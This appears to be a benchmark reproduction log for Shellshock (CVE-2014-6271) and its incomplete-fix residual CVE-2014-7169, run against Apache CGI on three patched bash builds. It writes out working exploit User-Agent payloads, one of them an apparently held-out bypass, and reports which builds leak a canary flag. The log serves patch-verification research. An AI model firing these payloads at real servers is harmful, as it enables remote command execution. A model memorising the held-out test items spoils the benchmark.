PatchClosure-Bench repro log — gnu-bash-shellshock-cve-2014-7169
================================================================
CVE pair : CVE-2014-6271 (Shellshock, original) -> CVE-2014-7169 (incomplete-fix residual)
Root cause: OS Command Injection via env-var function-definition parsing (CWE-78)
Mechanism family: command-injection   class_kind: rce-oob   oracle variant: same-sink (Variant A)
Run mode : real-app-http (REAL Apache httpd + mod_cgi; EXTERNAL HTTP trigger)
Gate run : 2026-07-16  (real Docker, one image `pcb-bash-shellshock:local`, fresh --build)
Per-run flag (gate): PCBFLAG_b38d2d06c4cab55ad0b1e7a852617772

REAL-APP-HTTP REBUILD (2026-07-16)
----------------------------------
The prior build triggered the sink via `docker compose exec -T v1 /probe.sh` (an
in-process env-var handed straight to bash). That in-process shortcut is BANNED.
This rebuild reaches the sink the real-world way: a REAL Apache httpd (prefork MPM +
mod_cgi) is booted per version; a trivial CGI endpoint (/cgi-bin/status.cgi) shells
out to THAT version's REAL bash with `-c`. An EXTERNAL HTTP request carrying a
malicious `User-Agent` header is mapped by Apache into the CGI env var
HTTP_USER_AGENT; the version's real bash imports exported-function values from the
environment at startup, so Shellshock fires (or not) purely inside that bash.
The REAL bash builds are unchanged; only the front end (Apache + mod_cgi + external
HTTP) was added. NO `rm` was used; stale files were left in place (see below).

RELATIONSHIP (genuine incomplete fix)
-------------------------------------
The first official patch for CVE-2014-6271 (bash43-025) closed the trailing-command
path of the function-import parser but STILL mis-parsed a malformed function
definition containing a dangling redirection. CVE-2014-7169 (Tavis Ormandy's
`() { (a)=>\` vector) shows the 025-patched parser still performs an attacker-
controlled redirection / command execution. Closed properly by bash43-026 (+027).
NVD CVE-2014-7169: "... NOTE: this vulnerability exists because of an incomplete
fix for CVE-2014-6271."

VERSIONS (real GNU Bash 4.3 compiled from ftp.gnu.org source + official patches)
--------------------------------------------------------------------------------
V0 = bash-4.3 + patches 001..024   /opt/bash-v0/bash   (pre-Shellshock, vulnerable)  port 38270
V1 = bash-4.3 + patches 001..025   /opt/bash-v1/bash   (CVE-2014-6271 fix; INCOMPLETE -> target)  port 38271
V2 = bash-4.3 + patches 001..027   /opt/bash-v2/bash   (CVE-2014-7169 fix; residual closed)  port 38272
Source: https://ftp.gnu.org/gnu/bash/bash-4.3.tar.gz
Patches: https://ftp.gnu.org/gnu/bash/bash-4.3-patches/bash43-0XX  (all applied cleanly)
Per profile: DEFAULT_BASH -> /usr/local/bin/target-bash (symlink), the CGI's bash.

SINK MODEL (real Apache mod_cgi over external HTTP)
---------------------------------------------------
Apache httpd (prefork MPM + mod_cgi) serves /cgi-bin/status.cgi. status.cgi is a
/bin/sh wrapper that `exec`s the version's real bash with `-c` on a benign
server-side diagnostic command -- the classic CGI-shells-out-to-bash /
sshd-ForceCommand class of sink. An external client sends a request whose
`User-Agent` header Apache maps to HTTP_USER_AGENT; the version bash imports it at
startup. Benign canary: /canary holds ${PCB_FLAG}; the only executed payload reads
/canary.

  Why a /bin/sh wrapper + `bash -c` (not a `#!/opt/bash-vN` shebang directly):
   - 6271 fires via a bash SCRIPT-FILE CGI (trailing command runs at import), but
   - 7169 does NOT: its dangling `>\` needs a *continuation* line, which the `-c`
     string supplies; when the version bash instead reads a script FILE, the
     malformed import corrupts the script's own parse (shebang line) and the body
     never runs (verified: rc=2, no leak). HTTP headers cannot carry a newline, so
     the continuation must come from the server-side `-c` string. dash (the outer
     /bin/sh) does not import shell functions, so it forwards the request unharmed.

SEED (CVE-2014-6271)  [GIVEN]  original_poc.py   -> flag in HTTP response body
  User-Agent: () { :;}; printf "Content-Type: text/plain\n\n"; printf "%s\n" "$(</canary)"; exit 0
  (reads /canary via the `$(<file)` bash builtin -- NOT a forked `cat`: the
   pre-Shellshock v0 build segfaults when the malformed-import trailing path forks
   an external command, and Apache drops a signal-killed CGI's output. The builtin
   read + `exit 0` exits cleanly, so Apache returns the flag in the body.)
RESIDUAL (CVE-2014-7169)  [HELD-OUT]  _heldout/bypass_poc.py  -> flag in fetched web file
  User-Agent: () { (a)=>\
  status.cgi -c continuation: /var/www/html/leaks/pcb_leak.dat cat /canary; echo ...
  On V1 the redirect leaks -> `>/var/www/html/leaks/pcb_leak.dat cat /canary` ->
  canary written to a web-served file; the oracle then GETs /leaks/pcb_leak.dat.

OBSERVED BEHAVIOUR (real HTTP via curl; each vector x2, deterministic)
----------------------------------------------------------------------
6271 seed (GET /cgi-bin/status.cgi, response body):
  V0 -> HTTP 200, body = <flag>                         (flag reached; unpatched)
  V1 -> HTTP 200, body = "shellshock-demo-cgi ok"; NO flag  (blocked by bash43-025)
  V2 -> HTTP 200, body = "shellshock-demo-cgi ok"; NO flag  (blocked)
7169 residual (GET /cgi-bin/status.cgi, then GET /leaks/pcb_leak.dat):
  V0 -> /leaks/pcb_leak.dat = <flag>                    (reached; more-vulnerable)
  V1 -> /leaks/pcb_leak.dat = <flag>                    (reached despite 6271 fix)
  V2 -> /leaks/pcb_leak.dat = 404 (no file); NO flag    (closed by bash43-026/027)

